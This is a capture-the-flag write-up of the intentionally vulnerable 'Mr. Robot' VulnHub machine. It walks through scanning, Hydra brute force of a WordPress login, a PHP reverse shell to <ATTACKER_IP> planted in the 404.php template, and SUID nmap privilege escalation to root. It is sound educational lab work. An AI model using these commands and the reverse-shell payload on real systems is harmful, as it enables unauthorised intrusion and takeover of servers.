# CTF Write-Up: Mr. Robot (VulnHub)

## 1. Overview

- **Machine Name:** Mr. Robot  
- **Platform:** VulnHub  
- **Difficulty:** Beginner / Intermediate  
- **Flags:** 3  
- **Author:** Masiha Jabbari  
- **Date:** 2025-12-26

This report documents the methodology and steps used to compromise the intentionally vulnerable *Mr. Robot* virtual machine. The engagement was conducted in a controlled lab environment for educational purposes only.

---

## 2. Lab Environment

- **Attacker Machine:** Kali Linux   
- **Target Machine:** Mr. Robot (VulnHub)  
- **Network Type:** Local virtual network  

---

## 3. Initial Reconnaissance

After booting the target machine and allowing it to fully initialize, I observed a login interface requiring credentials. Rather than immediately attempting authentication attacks without context, I proceeded with network-level reconnaissance to identify exposed services and potential attack vectors.

### 3.1 Network Scanning

```bash
nmap -T4 -A -v 192.168.50.0/24
```

I performed an aggressive network scan across the local subnet to identify active hosts, open ports, running services, and potential vulnerabilities. The scan enabled service version detection, OS fingerprinting, and execution of default NSE scripts.

**Result:**
- Target host identified at `192.168.50.210`
- Open services:
  - HTTP (80)
  - HTTPS (443)
- SSH (22) was not exposed during the initial reconnaissance phase


The HTTPS service was inspected and found to mirror the same content served over HTTP,
providing no additional attack surface beyond what was already exposed on port 80.


---

## 4. Web Enumeration

Navigating to the target IP revealed a command-line–style web interface themed after *Mr. Robot*. While visually engaging, manual inspection and client-side analysis did not expose useful functionality or vulnerabilities.

### 4.1 Directory Enumeration

```bash
gobuster dir --url http://192.168.50.210 \
--wordlist /home/<username>/wlists/SecLists/Discovery/Web-Content/common.txt
```

I performed directory and file enumeration against the web server to identify hidden or unlinked resources not exposed through normal browsing. A common SecLists wordlist was used to expand the attack surface.

**Notable Findings:**
- `robots.txt`
- `README.txt`
- `wp-login.php`
- Other exposed directories and files

---

## 5. Information Disclosure

### 5.1 robots.txt Analysis

The `robots.txt` file contained:
- **Flag 1**
- A downloadable wordlist: `fsociety.dic`

The discovered wordlist was saved for later use during authentication attacks.

---

## 6. WordPress Authentication Attack

The presence of `wp-login.php` confirmed that the application was running WordPress. Before launching password attacks, I first attempted to identify valid usernames.

### 6.1 Username Enumeration via Burp Suite

Using Burp Suite’s proxy and intruder functionality, I intercepted login requests to analyze server responses. By varying usernames while keeping the password constant, I observed response length differences.

Using `fsociety.dic` as the payload, one username produced a distinct response:

- **Valid Username Identified:** `elliot`

This confirmed a valid account and significantly reduced the authentication attack scope.

---

### 6.2 Password Brute-Forcing

WordPress authentication failures returned a consistent error message containing the phrase 
“is incorrect” in the HTTP response body. This string was therefore used as the failure 
condition for Hydra to distinguish invalid login attempts from successful authentication.


```bash
hydra -vV -l elliot -P /home/m-j-z/wlists/fsociety.dic \
192.168.50.210 http-post-form \
'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
```

I conducted a credential brute-force attack against the WordPress login interface using the confirmed username. The attack targeted the HTTP POST authentication mechanism and relied on response failure strings to detect valid credentials.

During execution, I observed multiple duplicate entries in the wordlist. To optimize the attack, I cleaned the list:

```bash
sort fsociety.dic | uniq > fsociety.txt
```

After rerunning the attack with the refined wordlist, valid credentials were obtained, granting authenticated access to the WordPress dashboard.

---

## 7. Initial Access (Reverse Shell)

With administrative access to WordPress, I identified the **Theme Editor** as a viable vector for remote code execution.

I modified the `404.php` template to include a PHP reverse shell payload:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1'"); ?>
```

Port 443 was selected for the reverse shell listener to blend with normal HTTPS traffic and
reduce the likelihood of outbound connection restrictions blocking the shell.


A Netcat listener was started:

```bash
sudo nc -lvp 443
```

By requesting a non-existent page to trigger the 404 handler, I successfully obtained a reverse shell as the web server user.

---

## 8. Post-Exploitation Enumeration

While enumerating the filesystem, I discovered the `/home/robot` directory containing:

- **Flag 2** (restricted permissions)
- `password.raw-md5`

The hash file was readable and contained the MD5 hash of the `robot` user’s password.

### 8.1 Hash Cracking


CrackStation was used for efficiency, as the hash was a common MD5 value present in public rainbow tables.
The hash was submitted to CrackStation, where it was matched against existing databases:

- **Recovered Password:** `abcdefghijklmnopqrstuvwxyz`

Using these credentials, I switched users:

```bash
su robot
```

Access to the second flag was then obtained.

---

## 9. Privilege Escalation

To escalate privileges, I searched for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

One notable binary was **nmap**, which is known to allow privilege escalation in older versions.

Using GTFOBins as a reference, I exploited nmap’s interactive mode:

```bash
nmap --interactive
nmap> !sh
```
The installed nmap version supported interactive mode, which is no longer available in modern releases.


Privilege escalation was confirmed:

```bash
whoami
# root
```

---

## 10. Root Access and Final Flag

With root access obtained, I navigated to `/root` and retrieved **Flag 3**, completing the challenge.

---

## 11. Conclusion

This CTF demonstrated the impact of:

- Information disclosure via misconfigured files
- Weak authentication controls
- Unsafe WordPress administration practices
- Misconfigured SUID binaries

The machine was successfully compromised from initial reconnaissance to full root access using standard penetration-testing methodology.

---

## 12. Disclaimer

This write-up is provided strictly for **educational purposes**. The target machine is intentionally vulnerable and owned by VulnHub. No unauthorized systems were targeted.

